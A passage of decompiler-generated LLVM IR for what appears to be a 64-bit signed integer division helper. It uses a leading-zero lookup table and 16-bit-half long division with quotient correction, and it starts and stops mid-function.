  %v0_172b8 = phi i32 [ %v1_174d4, %dec_label_pc_174d4 ], [ %v0_1714c102, %dec_label_pc_174bc ], [ %v0_1714c, %dec_label_pc_1715c ]
  %v2_17300 = phi i32 [ %v0_1716828, %dec_label_pc_174d4 ], [ %v6_174c0, %dec_label_pc_174bc ], [ %v0_17134, %dec_label_pc_1715c ]
  %stack_var_-56.1 = phi i32 [ %v1_174e0, %dec_label_pc_174d4 ], [ -1, %dec_label_pc_174bc ], [ 0, %dec_label_pc_1715c ]
  %v2_17164 = icmp eq i32 %v1_174a4, 0
  %v0_17170 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v2_17164, label %dec_label_pc_17178, label %dec_label_pc_17270

dec_label_pc_17178:                               ; preds = %dec_label_pc_17164
  %tmp217 = icmp ugt i32 %v0_172b8, %v2_17300
  br i1 %tmp217, label %dec_label_pc_17180, label %dec_label_pc_172b0

dec_label_pc_17180:                               ; preds = %dec_label_pc_17178
  %v2_17180 = icmp ugt i32 %v0_172b8, 65535
  br i1 %v2_17180, label %dec_label_pc_17660, label %dec_label_pc_17188

dec_label_pc_17188:                               ; preds = %dec_label_pc_17180
  %v2_17188 = icmp ugt i32 %v0_172b8, 254
  %v7_17188 = icmp eq i32 %v0_172b8, 255
  %v2_1718c = xor i1 %v7_17188, true
  %v3_1718c = and i1 %v2_17188, %v2_1718c
  br i1 %v3_1718c, label %bb, label %bb149

bb:                                               ; preds = %dec_label_pc_17188
  br label %bb149

bb149:                                            ; preds = %dec_label_pc_17188, %bb
  %v0_171ac58 = phi i32 [ %v0_171ac60, %dec_label_pc_17188 ], [ 24, %bb ]
  %v2_17190 = xor i1 %v2_17188, true
  %v3_17190 = or i1 %v7_17188, %v2_17190
  br i1 %v3_17190, label %bb150, label %.thread112

bb150:                                            ; preds = %bb149
  br label %.thread112

.thread112:                                       ; preds = %bb149, %bb150
  %v0_171ac57110 = phi i32 [ 32, %bb150 ], [ %v0_171ac58, %bb149 ]
  %v1_1719c53 = phi i32 [ 0, %bb150 ], [ %v0_17150108, %bb149 ]
  br i1 %v3_1718c, label %bb151, label %bb152

bb151:                                            ; preds = %.thread112
  br label %bb152

bb152:                                            ; preds = %bb212, %bb211, %.thread112, %bb151
  %v0_171ac = phi i32 [ 16, %bb212 ], [ %v0_171ac59, %bb211 ], [ %v0_171ac57110, %.thread112 ], [ %v0_171ac57110, %bb151 ]
  %v1_1719c = phi i32 [ %v1_1719c54, %bb212 ], [ %v1_1719c54, %bb211 ], [ %v1_1719c53, %.thread112 ], [ 8, %bb151 ]
  %v6_1719c = lshr i32 %v0_172b8, %v1_1719c
  store i32 %v6_1719c, i32* %r0.global-to-local, align 4
  %v4_171a4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.748 to i32), i32 36) to i32*), align 4
  store i32 %v4_171a4, i32* %r1.global-to-local, align 4
  %v2_171a8 = add i32 %v4_171a4, %v6_1719c
  %v3_171a8 = inttoptr i32 %v2_171a8 to i8*
  %v4_171a8 = load i8, i8* %v3_171a8, align 1
  %v6_171a8 = zext i8 %v4_171a8 to i32
  %v2_171ac = sub nsw i32 %v0_171ac, %v6_171a8
  store i32 %v2_171ac, i32* %r1.global-to-local, align 4
  %v9_171ac = icmp eq i32 %v0_171ac, %v6_171a8
  br i1 %v9_171ac, label %.thread2.thread20, label %bb154

.thread2.thread20:                                ; preds = %bb152
  br label %bb155

bb154:                                            ; preds = %bb152
  %v7_171b0 = shl i32 %v2_17300, %v2_171ac
  %v2_171b4 = sub i32 32, %v2_171ac
  %v7_171b8 = shl i32 %v0_172b8, %v2_171ac
  %v8_171bc = lshr i32 %v0_17170, %v2_171b4
  %v9_171bc = or i32 %v8_171bc, %v7_171b0
  %v7_171c4 = shl i32 %v0_17170, %v2_171ac
  br label %bb155

bb155:                                            ; preds = %.thread2.thread20, %bb154
  %v0_1723c = phi i32 [ %v0_17170, %.thread2.thread20 ], [ %v7_171c4, %bb154 ]
  %v0_1721c.in = phi i32 [ %v0_172b8, %.thread2.thread20 ], [ %v7_171b8, %bb154 ]
  %v1_17250 = phi i32 [ %v0_172b8, %.thread2.thread20 ], [ %v7_171b8, %bb154 ]
  %v0_171dc = phi i32 [ %v2_17300, %.thread2.thread20 ], [ %v9_171bc, %bb154 ]
  %v0_1721c = udiv i32 %v0_1721c.in, 65536
  %v2_171d0 = udiv i32 %v0_171dc, %v0_1721c
  %v3_171e0 = urem i32 %v0_171dc, %v0_1721c
  store i32 %v2_171d0, i32* %r0.global-to-local, align 4
  store i32 %v3_171e0, i32* %r1.global-to-local, align 4
  %v3_171e8 = urem i32 %v1_17250, 65536
  %v2_171ec = mul i32 %v2_171d0, %v3_171e8
  %v3_171f0 = udiv i32 %v0_1723c, 65536
  %v4_171f4 = mul nuw i32 %v3_171e0, 65536
  %v5_171f4 = or i32 %v4_171f4, %v3_171f0
  %tmp218 = icmp ugt i32 %v2_171ec, %v5_171f4
  br i1 %tmp218, label %dec_label_pc_17200, label %.thread114

dec_label_pc_17200:                               ; preds = %bb155
  %v2_17200 = add i32 %v5_171f4, %v1_17250
  %v3_17200 = icmp ult i32 %v2_17200, %v5_171f4
  %v1_17204 = add i32 %v2_171d0, -1
  br i1 %v3_17200, label %.thread114, label %dec_label_pc_1720c

dec_label_pc_1720c:                               ; preds = %dec_label_pc_17200
  %tmp219 = icmp ugt i32 %v2_171ec, %v2_17200
  br i1 %tmp219, label %bb156, label %.thread114

bb156:                                            ; preds = %dec_label_pc_1720c
  %v5_17210 = add i32 %v2_171d0, -2
  %v6_17214 = add i32 %v2_17200, %v1_17250
  br label %.thread114

.thread114:                                       ; preds = %bb155, %dec_label_pc_1720c, %dec_label_pc_17200, %bb156
  %v1_17264 = phi i32 [ %v1_17204, %dec_label_pc_17200 ], [ %v2_171d0, %bb155 ], [ %v5_17210, %bb156 ], [ %v1_17204, %dec_label_pc_1720c ]
  %v1_17218 = phi i32 [ %v2_17200, %dec_label_pc_17200 ], [ %v5_171f4, %bb155 ], [ %v6_17214, %bb156 ], [ %v2_17200, %dec_label_pc_1720c ]
  %v2_17218 = sub i32 %v1_17218, %v2_171ec
  %v2_17224 = udiv i32 %v2_17218, %v0_1721c
  %v3_17234 = urem i32 %v2_17218, %v0_1721c
  store i32 %v3_17234, i32* %r1.global-to-local, align 4
  %v2_17238 = mul i32 %v2_17224, %v3_171e8
  %v3_17240 = urem i32 %v0_1723c, 65536
  %v4_17244 = mul nuw i32 %v3_17234, 65536
  %v5_17244 = or i32 %v4_17244, %v3_17240
  store i32 %v5_17244, i32* %r0.global-to-local, align 4
  %tmp220 = icmp ugt i32 %v2_17238, %v5_17244
  br i1 %tmp220, label %dec_label_pc_17250, label %bb158

dec_label_pc_17250:                               ; preds = %.thread114
  %v2_17250 = add i32 %v5_17244, %v1_17250
  %v3_17250 = icmp ult i32 %v2_17250, %v5_17244
  %v1_17254 = add i32 %v2_17224, -1
  br i1 %v3_17250, label %bb158, label %dec_label_pc_1725c

dec_label_pc_1725c:                               ; preds = %dec_label_pc_17250
  %tmp221 = icmp ugt i32 %v2_17238, %v2_17250
  br i1 %tmp221, label %bb157, label %bb158

bb157:                                            ; preds = %dec_label_pc_1725c
  %v5_17260 = add i32 %v2_17224, -2
  br label %bb158

bb158:                                            ; preds = %.thread114, %dec_label_pc_17250, %dec_label_pc_1725c, %bb157
  %v0_17264 = phi i32 [ %v1_17254, %dec_label_pc_17250 ], [ %v2_17224, %.thread114 ], [ %v1_17254, %dec_label_pc_1725c ], [ %v5_17260, %bb157 ]
  %v4_17264 = mul i32 %v1_17264, 65536
  %v5_17264 = or i32 %v0_17264, %v4_17264
  store i32 %v5_17264, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17284

dec_label_pc_17270:                               ; preds = %dec_label_pc_17164
  %v9_17270 = icmp eq i32 %v2_17300, %v1_174a4
  %tmp222 = icmp ult i32 %v2_17300, %v1_174a4
  br i1 %tmp222, label %dec_label_pc_1727c, label %dec_label_pc_1746c

dec_label_pc_1727c:                               ; preds = %bb182, %dec_label_pc_17270, %bb183
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17284

dec_label_pc_17284:                               ; preds = %.thread13, %bb204, %dec_label_pc_17654, %bb171, %bb158, %dec_label_pc_1727c
  %v0_172a0 = phi i32 [ 0, %bb204 ], [ %v1_174ac, %.thread13 ], [ 0, %dec_label_pc_17654 ], [ %storemerge131, %bb171 ], [ 0, %bb158 ], [ 0, %dec_label_pc_1727c ]
  %v0_1729c = phi i32 [ %v5_175f8, %bb204 ], [ 1, %.thread13 ], [ %v1_17654, %dec_label_pc_17654 ], [ %v5_17460, %bb171 ], [ %v5_17264, %bb158 ], [ 0, %dec_label_pc_1727c ]
  %v2_17290 = icmp eq i32 %stack_var_-56.1, 0
  store i32 %v0_1729c, i32* %r0.global-to-local, align 4
  store i32 %v0_172a0, i32* %r1.global-to-local, align 4
  br i1 %v2_17290, label %dec_label_pc_172a4, label %dec_label_pc_1729c

dec_label_pc_1729c:                               ; preds = %dec_label_pc_17284
  %v1_1729c = sub i32 0, %v0_1729c
  store i32 %v1_1729c, i32* %r0.global-to-local, align 4
  %v2_1729c = icmp eq i32 %v0_1729c, 0
  %v2_172a0 = icmp eq i1 %v2_1729c, false
  %v5_172a0 = sext i1 %v2_172a0 to i32
  %v6_172a0 = sub i32 %v5_172a0, %v0_172a0
  store i32 %v6_172a0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_172a4

dec_label_pc_172a4:                               ; preds = %dec_label_pc_17284, %dec_label_pc_1729c
  %v1_172ac = phi i32 [ %v0_1729c, %dec_label_pc_17284 ], [ %v1_1729c, %dec_label_pc_1729c ]
  %v2_172ac = sext i32 %v1_172ac to i64
  ret i64 %v2_172ac

dec_label_pc_172b0:                               ; preds = %dec_label_pc_17178
  %v2_172b0 = icmp eq i32 %v0_172b8, 0
  br i1 %v2_172b0, label %dec_label_pc_172b8, label %dec_label_pc_172c8

dec_label_pc_172b8:                               ; preds = %dec_label_pc_172b0
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_172c8

dec_label_pc_172c8:                               ; preds = %dec_label_pc_172b0, %dec_label_pc_172b8
  %v0_17318 = phi i32 [ %v0_172b8, %dec_label_pc_172b0 ], [ 0, %dec_label_pc_172b8 ]
  %v3_172cc = icmp ult i32 %v0_17318, 65534
  br i1 %v3_172cc, label %dec_label_pc_174ec, label %dec_label_pc_172d0

dec_label_pc_172d0:                               ; preds = %dec_label_pc_172c8
  %v3_172d4 = icmp ugt i32 %v0_17318, 16777214
  %v9_172d4 = icmp eq i32 %v0_17318, 16777215
  %v2_172d8 = xor i1 %v9_172d4, true
  %v3_172d8 = and i1 %v3_172d4, %v2_172d8
  br i1 %v3_172d8, label %bb160, label %bb161

bb160:                                            ; preds = %dec_label_pc_172d0
  br label %bb161

bb161:                                            ; preds = %dec_label_pc_172d0, %bb160
  %v1_172e873 = phi i32 [ 16777215, %dec_label_pc_172d0 ], [ 24, %bb160 ]
  %v2_172dc = xor i1 %v3_172d4, true
  %v3_172dc = or i1 %v9_172d4, %v2_172dc
  br i1 %v3_172dc, label %bb162, label %bb163

bb162:                                            ; preds = %bb161
  br label %bb163

bb163:                                            ; preds = %bb161, %bb162
  %v1_172e872 = phi i32 [ %v1_172e873, %bb161 ], [ 16, %bb162 ]
  br i1 %v3_172d8, label %bb164, label %bb165

bb164:                                            ; preds = %bb163
  br label %bb165

bb165:                                            ; preds = %bb163, %bb164
  %v0_172f876 = phi i32 [ %v0_171ac60, %bb163 ], [ 8, %bb164 ]
  br i1 %v3_172dc, label %bb166, label %bb167

bb166:                                            ; preds = %bb165
  br label %bb167

bb167:                                            ; preds = %bb187, %.thread120, %bb165, %bb166
  %v0_172f8 = phi i32 [ %v0_172f877118, %bb187 ], [ %v0_172f877118, %.thread120 ], [ %v0_172f876, %bb165 ], [ 16, %bb166 ]
  %v1_172e8 = phi i32 [ 8, %bb187 ], [ %v1_172e874, %.thread120 ], [ %v1_172e872, %bb165 ], [ %v1_172e872, %bb166 ]
  %v6_172e8 = lshr i32 %v0_17318, %v1_172e8
  store i32 %v6_172e8, i32* %r0.global-to-local, align 4
  %v4_172f0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.748 to i32), i32 36) to i32*), align 4
  store i32 %v4_172f0, i32* %r1.global-to-local, align 4
  %v2_172f4 = add i32 %v4_172f0, %v6_172e8
  %v3_172f4 = inttoptr i32 %v2_172f4 to i8*
  %v4_172f4 = load i8, i8* %v3_172f4, align 1
  %v6_172f4 = zext i8 %v4_172f4 to i32
  %v2_172f8 = sub nsw i32 %v0_172f8, %v6_172f4
  %v9_172f8 = icmp eq i32 %v0_172f8, %v6_172f4
  br i1 %v9_172f8, label %.thread11, label %dec_label_pc_17314

.thread11:                                        ; preds = %bb167
  %v3_17300 = sub i32 %v2_17300, %v0_17318
  %v4_17304 = urem i32 %v0_17318, 65536
  %v4_17308 = udiv i32 %v0_17318, 65536
  br label %dec_label_pc_173cc

dec_label_pc_17314:                               ; preds = %bb167
  %v6_17314 = shl i32 %v2_17300, %v2_172f8
  %v6_17318 = shl i32 %v0_17318, %v2_172f8
  %v1_1731c = sub i32 32, %v2_172f8
  %v6_17320 = lshr i32 %v2_17300, %v1_1731c
  %v7_17324 = lshr i32 %v0_17170, %v1_1731c
  %v8_17324 = or i32 %v7_17324, %v6_17314
  %v3_17328 = udiv i32 %v6_17318, 65536
  %v2_17338 = udiv i32 %v6_17320, %v3_17328
  %v3_17348 = urem i32 %v6_17320, %v3_17328
  store i32 %v2_17338, i32* %r0.global-to-local, align 4
  store i32 %v3_17348, i32* %r1.global-to-local, align 4
  %v3_17350 = urem i32 %v6_17318, 65536
  %v2_17354 = mul i32 %v2_17338, %v3_17350
  %v3_1735c = udiv i32 %v8_17324, 65536
  %v4_17360 = mul nuw i32 %v3_17348, 65536
  %v5_17360 = or i32 %v4_17360, %v3_1735c
  %tmp223 = icmp ugt i32 %v2_17354, %v5_17360
  br i1 %tmp223, label %dec_label_pc_1736c, label %dec_label_pc_17378

dec_label_pc_1736c:                               ; preds = %dec_label_pc_17314
  %v2_1736c = add i32 %v5_17360, %v6_17318
  %v3_1736c = icmp ult i32 %v2_1736c, %v5_17360
  %v1_17370 = add i32 %v2_17338, -1
  br i1 %v3_1736c, label %dec_label_pc_17378, label %dec_label_pc_176b0

dec_label_pc_17378:                               ; preds = %dec_label_pc_17314, %dec_label_pc_176b0, %bb216, %dec_label_pc_1736c
  %v1_173c8 = phi i32 [ %v5_176b4, %bb216 ], [ %v1_17370, %dec_label_pc_1736c ], [ %v2_17338, %dec_label_pc_17314 ], [ %v1_17370, %dec_label_pc_176b0 ]
  %v1_17378 = phi i32 [ %v6_176b8, %bb216 ], [ %v2_1736c, %dec_label_pc_1736c ], [ %v5_17360, %dec_label_pc_17314 ], [ %v2_1736c, %dec_label_pc_176b0 ]
  %v2_17378 = sub i32 %v1_17378, %v2_17354
  %v2_17384 = udiv i32 %v2_17378, %v3_17328
  %v3_17394 = urem i32 %v2_17378, %v3_17328
  store i32 %v3_17394, i32* %r1.global-to-local, align 4
  %v2_17398 = mul i32 %v2_17384, %v3_17350
  %v3_173a4 = urem i32 %v8_17324, 65536
  %v4_173a8 = mul nuw i32 %v3_17394, 65536
  %v5_173a8 = or i32 %v4_173a8, %v3_173a4
  store i32 %v5_173a8, i32* %r0.global-to-local, align 4
  %tmp224 = icmp ugt i32 %v2_17398, %v5_173a8
  br i1 %tmp224, label %dec_label_pc_173b4, label %dec_label_pc_173c0

dec_label_pc_173b4:                               ; preds = %dec_label_pc_17378
  %v2_173b4 = add i32 %v5_173a8, %v6_17318
  store i32 %v2_173b4, i32* %r0.global-to-local, align 4
  %v3_173b4 = icmp ult i32 %v2_173b4, %v5_173a8
  %v1_173b8 = add i32 %v2_17384, -1
  br i1 %v3_173b4, label %dec_label_pc_173c0, label %dec_label_pc_176a0

dec_label_pc_173c0:                               ; preds = %dec_label_pc_17378, %dec_label_pc_176a0, %bb215, %dec_label_pc_173b4
  %v0_173c8 = phi i32 [ %v5_176a4, %bb215 ], [ %v1_173b8, %dec_label_pc_173b4 ], [ %v2_17384, %dec_label_pc_17378 ], [ %v1_173b8, %dec_label_pc_176a0 ]
  %v1_173c4 = phi i32 [ %v6_176a8, %bb215 ], [ %v2_173b4, %dec_label_pc_173b4 ], [ %v5_173a8, %dec_label_pc_17378 ], [ %v2_173b4, %dec_label_pc_176a0 ]
  %v6_173c0 = shl i32 %v0_17170, %v2_172f8
  %v2_173c4 = sub i32 %v1_173c4, %v2_17398
  %v4_173c8 = mul i32 %v1_173c8, 65536
  %v5_173c8 = or i32 %v0_173c8, %v4_173c8
  br label %dec_label_pc_173cc

dec_label_pc_173cc:                               ; preds = %.thread11, %dec_label_pc_173c0
  %storemerge131 = phi i32 [ %v5_173c8, %dec_label_pc_173c0 ], [ 1, %.thread11 ]
  %v1_1744c = phi i32 [ %v6_17318, %dec_label_pc_173c0 ], [ %v0_17318, %.thread11 ]
  %v0_17438 = phi i32 [ %v6_173c0, %dec_label_pc_173c0 ], [ %v0_17170, %.thread11 ]
  %v0_17434 = phi i32 [ %v3_17350, %dec_label_pc_173c0 ], [ %v4_17304, %.thread11 ]
  %v0_173d0 = phi i32 [ %v2_173c4, %dec_label_pc_173c0 ], [ %v3_17300, %.thread11 ]
  %v0_17418 = phi i32 [ %v3_17328, %dec_label_pc_173c0 ], [ %v4_17308, %.thread11 ]
  %v2_173d4 = udiv i32 %v0_173d0, %v0_17418
  %v3_173e4 = urem i32 %v0_173d0, %v0_17418
  store i32 %v2_173d4, i32* %r0.global-to-local, align 4
  store i32 %v3_173e4, i32* %r1.global-to-local, align 4
  %v2_173e8 = mul i32 %v2_173d4, %v0_17434
  %v3_173ec = udiv i32 %v0_17438, 65536
  %v4_173f0 = mul nuw i32 %v3_173e4, 65536
  %v5_173f0 = or i32 %v4_173f0, %v3_173ec
  %tmp225 = icmp ugt i32 %v2_173e8, %v5_173f0
  br i1 %tmp225, label %dec_label_pc_173fc, label %.thread116

dec_label_pc_173fc:                               ; preds = %dec_label_pc_173cc
  %v2_173fc = add i32 %v5_173f0, %v1_1744c
  %v3_173fc = icmp ult i32 %v2_173fc, %v5_173f0
  %v1_17400 = add i32 %v2_173d4, -1
  br i1 %v3_173fc, label %.thread116, label %dec_label_pc_17408

dec_label_pc_17408:                               ; preds = %dec_label_pc_173fc
  %tmp226 = icmp ugt i32 %v2_173e8, %v2_173fc
  br i1 %tmp226, label %bb169, label %.thread116

bb169:                                            ; preds = %dec_label_pc_17408
  %v5_1740c = add i32 %v2_173d4, -2
  %v6_17410 = add i32 %v2_173fc, %v1_1744c
  br label %.thread116

.thread116:                                       ; preds = %dec_label_pc_173cc, %dec_label_pc_17408, %dec_label_pc_173fc, %bb169
  %v1_17460 = phi i32 [ %v1_17400, %dec_label_pc_173fc ], [ %v2_173d4, %dec_label_pc_173cc ], [ %v5_1740c, %bb169 ], [ %v1_17400, %dec_label_pc_17408 ]
  %v1_17414 = phi i32 [ %v2_173fc, %dec_label_pc_173fc ], [ %v5_173f0, %dec_label_pc_173cc ], [ %v6_17410, %bb169 ], [ %v2_173fc, %dec_label_pc_17408 ]
  %v2_17414 = sub i32 %v1_17414, %v2_173e8
  %v2_17420 = udiv i32 %v2_17414, %v0_17418
  %v3_17430 = urem i32 %v2_17414, %v0_17418
  store i32 %v3_17430, i32* %r1.global-to-local, align 4
  %v2_17434 = mul i32 %v2_17420, %v0_17434
  %v3_1743c = urem i32 %v0_17438, 65536
  %v4_17440 = mul nuw i32 %v3_17430, 65536
  %v5_17440 = or i32 %v4_17440, %v3_1743c
  store i32 %v5_17440, i32* %r0.global-to-local, align 4
  %tmp227 = icmp ugt i32 %v2_17434, %v5_17440
  br i1 %tmp227, label %dec_label_pc_1744c, label %bb171

dec_label_pc_1744c:                               ; preds = %.thread116
  %v2_1744c = add i32 %v5_17440, %v1_1744c
  %v3_1744c = icmp ult i32 %v2_1744c, %v5_17440
  %v1_17450 = add i32 %v2_17420, -1
  br i1 %v3_1744c, label %bb171, label %dec_label_pc_17458

dec_label_pc_17458:                               ; preds = %dec_label_pc_1744c
  %tmp228 = icmp ugt i32 %v2_17434, %v2_1744c
  br i1 %tmp228, label %bb170, label %bb171

bb170:                                            ; preds = %dec_label_pc_17458
  %v5_1745c = add i32 %v2_17420, -2
  br label %bb171

bb171:                                            ; preds = %.thread116, %dec_label_pc_1744c, %dec_label_pc_17458, %bb170
  %v0_17460 = phi i32 [ %v1_17450, %dec_label_pc_1744c ], [ %v2_17420, %.thread116 ], [ %v1_17450, %dec_label_pc_17458 ], [ %v5_1745c, %bb170 ]
  %v4_17460 = mul i32 %v1_17460, 65536
  %v5_17460 = or i32 %v0_17460, %v4_17460
  store i32 %v5_17460, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17284

dec_label_pc_1746c:                               ; preds = %dec_label_pc_17270
  %v3_17470 = icmp ult i32 %v1_174a4, 65534
  br i1 %v3_17470, label %dec_label_pc_17504, label %dec_label_pc_17474

dec_label_pc_17474:                               ; preds = %dec_label_pc_1746c
  %v3_17478 = icmp ugt i32 %v1_174a4, 16777214
  %v9_17478 = icmp eq i32 %v1_174a4, 16777215
  %v2_1747c = xor i1 %v9_17478, true
  %v3_1747c = and i1 %v3_17478, %v2_1747c
  br i1 %v3_1747c, label %bb173, label %bb174

bb173:                                            ; preds = %dec_label_pc_17474
  br label %bb174

bb174:                                            ; preds = %dec_label_pc_17474, %bb173
  %v1_1748431 = phi i32 [ 16777215, %dec_label_pc_17474 ], [ 24, %bb173 ]
  %v2_17480 = xor i1 %v3_17478, true
  %v3_17480 = or i1 %v9_17478, %v2_17480
  br i1 %v3_17480, label %bb175, label %bb176

bb175:                                            ; preds = %bb174
  br label %bb176

bb176:                                            ; preds = %bb174, %bb175
  %v1_17484 = phi i32 [ %v1_1748431, %bb174 ], [ 16, %bb175 ]
  %v2_17484 = add nsw i32 %v1_17484, -1
  %v3_17484 = shl i32 1, %v2_17484
  %v4_17484 = and i32 %v3_17484, %v1_174a4
  %v5_17484 = icmp ne i32 %v4_17484, 0
  %v6_17484 = lshr i32 %v1_174a4, %v1_17484
  store i32 %v6_17484, i32* %r0.global-to-local, align 4
  %v4_1748c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.748 to i32), i32 36) to i32*), align 4
  store i32 %v4_1748c, i32* %r1.global-to-local, align 4
  %v2_17490 = add i32 %v4_1748c, %v6_17484
  %v3_17490 = inttoptr i32 %v2_17490 to i8*
  %v4_17490 = load i8, i8* %v3_17490, align 1
  %v6_17490 = zext i8 %v4_17490 to i32
  %v3_17494 = and i1 %v5_17484, %v2_1747c
  br i1 %v3_17494, label %bb177, label %bb178

bb177:                                            ; preds = %bb176
  br label %bb178

bb178:                                            ; preds = %bb176, %bb177
  %v0_1749c33 = phi i32 [ %v27_17128, %bb176 ], [ 8, %bb177 ]
  %v2_17498 = xor i1 %v5_17484, true
  %v3_17498 = or i1 %v9_17478, %v2_17498
  br i1 %v3_17498, label %bb179, label %bb180

bb179:                                            ; preds = %bb178
  br label %bb180

bb180:                                            ; preds = %bb178, %bb179
  %v0_1749c = phi i32 [ %v0_1749c33, %bb178 ], [ 16, %bb179 ]
  %v2_1749c = sub i32 %v0_1749c, %v6_17490
  %v9_1749c = icmp eq i32 %v0_1749c, %v6_17490
  br i1 %v9_1749c, label %dec_label_pc_174a4, label %dec_label_pc_17530

dec_label_pc_174a4:                               ; preds = %bb180, %bb195
  %v1_174ac = phi i32 [ %v2_1749c, %bb180 ], [ %v2_17528, %bb195 ]
  %v3_174a4 = icmp uge i32 %v2_17300, %v1_174a4
  %v2_174a8 = xor i1 %v3_174a4, true
  %v3_174a8 = or i1 %v9_17270, %v2_174a8
  br i1 %v3_174a8, label %bb182, label %bb183

bb182:                                            ; preds = %dec_label_pc_174a4
  %v7_174a8 = icmp ult i32 %v0_17170, %v0_172b8
  br i1 %v7_174a8, label %dec_label_pc_1727c, label %.thread13

bb183:                                            ; preds = %dec_label_pc_174a4
  br i1 %v3_174a4, label %.thread13, label %dec_label_pc_1727c

.thread13:                                        ; preds = %bb182, %bb183
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17284

dec_label_pc_174bc:                               ; preds = %entry
  %v0_1714c102 = load i32, i32* @r2, align 4
  %v0_17150103 = load i32, i32* @r3, align 4
  %v0_174bc = load i32, i32* %r0.global-to-local, align 4
  %v1_174bc = sub i32 0, %v0_174bc
  store i32 %v1_174bc, i32* %r0.global-to-local, align 4
  %v2_174bc = icmp eq i32 %v0_174bc, 0
  %v2_174c0 = icmp eq i1 %v2_174bc, false
  %v5_174c0 = sext i1 %v2_174c0 to i32
  %v6_174c0 = sub i32 %v5_174c0, %v0_17134
  store i32 %v6_174c0, i32* %r1.global-to-local, align 4
  %v1_174c8 = icmp slt i32 %v0_17150103, 0
  br i1 %v1_174c8, label %dec_label_pc_174d4, label %dec_label_pc_17164

dec_label_pc_174d4:                               ; preds = %dec_label_pc_174bc, %dec_label_pc_1715c
  %v0_17150107 = phi i32 [ %v0_17150103, %dec_label_pc_174bc ], [ %v0_17150, %dec_label_pc_1715c ]
  %v0_1714c104 = phi i32 [ %v0_1714c102, %dec_label_pc_174bc ], [ %v0_1714c, %dec_label_pc_1715c ]
  %v0_1716828 = phi i32 [ %v6_174c0, %dec_label_pc_174bc ], [ %v0_17134, %dec_label_pc_1715c ]
  %stack_var_-56.2 = phi i32 [ -1, %dec_label_pc_174bc ], [ 0, %dec_label_pc_1715c ]
  %v1_174d4 = sub i32 0, %v0_1714c104
  %v2_174d4 = icmp eq i32 %v0_1714c104, 0
  %v2_174d8 = icmp eq i1 %v2_174d4, false
  %v5_174d8 = sext i1 %v2_174d8 to i32
  %v6_174d8 = sub i32 %v5_174d8, %v0_17150107
  %v1_174e0 = sub nsw i32 -1, %stack_var_-56.2
  br label %dec_label_pc_17164

dec_label_pc_174ec:                               ; preds = %dec_label_pc_172c8
  %v2_174ec = icmp ugt i32 %v0_17318, 254
  %v7_174ec = icmp eq i32 %v0_17318, 255
  %v2_174f0 = xor i1 %v7_174ec, true
  %v3_174f0 = and i1 %v2_174ec, %v2_174f0
  br i1 %v3_174f0, label %bb184, label %bb185

bb184:                                            ; preds = %dec_label_pc_174ec
  br label %bb185

bb185:                                            ; preds = %dec_label_pc_174ec, %bb184
  %v0_172f878 = phi i32 [ %v0_171ac60, %dec_label_pc_174ec ], [ 24, %bb184 ]
  %v2_174f4 = xor i1 %v2_174ec, true
  %v3_174f4 = or i1 %v7_174ec, %v2_174f4
  br i1 %v3_174f4, label %bb186, label %.thread120

bb186:                                            ; preds = %bb185
  br label %.thread120

.thread120:                                       ; preds = %bb185, %bb186
  %v0_172f877118 = phi i32 [ 32, %bb186 ], [ %v0_172f878, %bb185 ]
  %v1_172e874 = phi i32 [ 0, %bb186 ], [ %v0_17150108, %bb185 ]
  br i1 %v3_174f0, label %bb187, label %bb167

bb187:                                            ; preds = %.thread120
  br label %bb167

dec_label_pc_17504:                               ; preds = %dec_label_pc_1746c
  %v2_17504 = icmp ugt i32 %v1_174a4, 254
  %v7_17504 = icmp eq i32 %v1_174a4, 255
  %v2_17508 = xor i1 %v7_17504, true
  %v3_17508 = and i1 %v2_17504, %v2_17508
  br i1 %v3_17508, label %bb188, label %bb189

bb188:                                            ; preds = %dec_label_pc_17504
  br label %bb189

bb189:                                            ; preds = %dec_label_pc_17504, %bb188
  %v1_1751035 = phi i32 [ %v0_17150108, %dec_label_pc_17504 ], [ 8, %bb188 ]
  %v2_1750c = xor i1 %v2_17504, true
  %v3_1750c = or i1 %v7_17504, %v2_1750c
  br i1 %v3_1750c, label %bb190, label %bb191

bb190:                                            ; preds = %bb189
  br label %bb191

bb191:                                            ; preds = %bb189, %bb190
  %v1_17510 = phi i32 [ %v1_1751035, %bb189 ], [ 0, %bb190 ]
  %v2_17510 = add i32 %v1_17510, -1
  %v3_17510 = shl i32 1, %v2_17510
  %v4_17510 = and i32 %v3_17510, %v1_174a4
  %v5_17510 = icmp ne i32 %v4_17510, 0
  %v6_17510 = lshr i32 %v1_174a4, %v1_17510
  store i32 %v6_17510, i32* %r0.global-to-local, align 4
  %v4_17518 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.748 to i32), i32 36) to i32*), align 4
  store i32 %v4_17518, i32* %r1.global-to-local, align 4
  %v2_1751c = add i32 %v4_17518, %v6_17510
  %v3_1751c = inttoptr i32 %v2_1751c to i8*
  %v4_1751c = load i8, i8* %v3_1751c, align 1
  %v6_1751c = zext i8 %v4_1751c to i32
  %v3_17520 = and i1 %v5_17510, %v2_17508
  br i1 %v3_17520, label %bb192, label %bb193

bb192:                                            ; preds = %bb191
  br label %bb193

bb193:                                            ; preds = %bb191, %bb192
  %v0_1752837 = phi i32 [ %v27_17128, %bb191 ], [ 24, %bb192 ]
  %v2_17524 = xor i1 %v5_17510, true
  %v3_17524 = or i1 %v7_17504, %v2_17524
  br i1 %v3_17524, label %bb194, label %bb195

bb194:                                            ; preds = %bb193
  br label %bb195

bb195:                                            ; preds = %bb193, %bb194
  %v0_17528 = phi i32 [ %v0_1752837, %bb193 ], [ 32, %bb194 ]
  %v2_17528 = sub i32 %v0_17528, %v6_1751c
  %v9_17528 = icmp eq i32 %v0_17528, %v6_1751c
  br i1 %v9_17528, label %dec_label_pc_174a4, label %dec_label_pc_17530

dec_label_pc_17530:                               ; preds = %bb180, %bb195
